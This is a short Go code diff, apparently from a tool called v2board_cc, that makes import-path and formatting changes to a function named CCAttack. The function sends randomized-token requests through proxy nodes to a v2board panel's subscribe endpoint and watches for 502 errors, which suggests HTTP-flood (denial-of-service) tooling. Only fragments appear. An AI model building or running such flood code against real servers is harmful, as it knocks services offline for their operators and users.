@@ -15,7 +15,7 @@ import (
 	C "github.com/Dreamacro/clash/constant"
 	"github.com/go-resty/resty/v2"
 
-	"v2board_cc/config"
+	"github.com/thank243/v2board_cc/config"
 )
 
 type Nodes struct {
@@ -61,7 +61,7 @@ func CCAttack(p *Nodes, counts *int, status *int) (aliveProxies *Nodes, err erro
 	baseURL.Path = "api/v1/client/subscribe"
 	params := url.Values{}
 	u4, _ := uuid.NewV4()
-	params.Add("token", strings.ReplaceAll(u4.String(),"-", ""))
+	params.Add("token", strings.ReplaceAll(u4.String(), "-", ""))
 	baseURL.RawQuery = params.Encode()
 
 	addr, err := urlToMetadata(baseURL.String())
@@ -92,13 +92,13 @@ func CCAttack(p *Nodes, counts *int, status *int) (aliveProxies *Nodes, err erro
 	)
 	_ = json.Unmarshal(resp.Body(), &buf)
 
-	switch  {
-	case resp.StatusCode() == 502 :
+	switch {
+	case resp.StatusCode() == 502:
 		*status = resp.StatusCode()
 		aliveProxies = p
 		fmt.Printf("[%d] %d\n", *counts, resp.StatusCode())
 		return
-	case resp.StatusCode() < 500 && resp.StatusCode() > 0 :
+	case resp.StatusCode() < 500 && resp.StatusCode() > 0:
 		*status = resp.StatusCode()
 		if resp.StatusCode() != 403 {
 			aliveProxies = p
